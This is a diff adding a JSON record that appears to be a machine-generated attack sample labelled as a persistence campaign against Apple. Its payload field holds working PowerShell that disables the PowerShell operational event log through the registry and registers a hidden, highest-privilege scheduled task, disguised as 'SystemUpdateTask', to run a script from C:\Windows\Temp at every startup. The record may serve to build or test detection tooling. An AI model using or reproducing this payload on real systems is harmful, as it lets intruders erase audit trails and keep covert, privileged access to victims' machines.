@@ -1,0 +1,11 @@
+{
+  "organization": "Apple",
+  "campaign_type": "persistence",
+  "evasion_techniques": [
+    "etw_bypass",
+    "process_hollowing"
+  ],
+  "payload": "# 1GJHmDsi4UfOXLTmueC8\n# Generated: 2025-11-03T12:20:52.710201\n# System: Bzkp3BfVO9d7XcI\n# Process: NuGoQtxYnmEs\n\n\n# ETW Bypass via Registry\nRemove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winevt\\Channels\\Microsoft-Windows-PowerShell/Operational\" -Name \"Enabled\" -ErrorAction SilentlyContinue\n\n\n\n# Persistence via scheduled task\n$taskName = \"SystemUpdateTask\"\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -File C:\\Windows\\Temp\\payload.ps1\"\n$trigger = New-ScheduledTaskTrigger -AtStartup\n$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\n\nRegister-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force\n",
+  "generated_at": "2025-11-03T12:20:52.710209",
+  "signature": "3d9e72bb088d858cec16ba557189141519bf5acfab743e387f4d56dbf3356fec"
+}
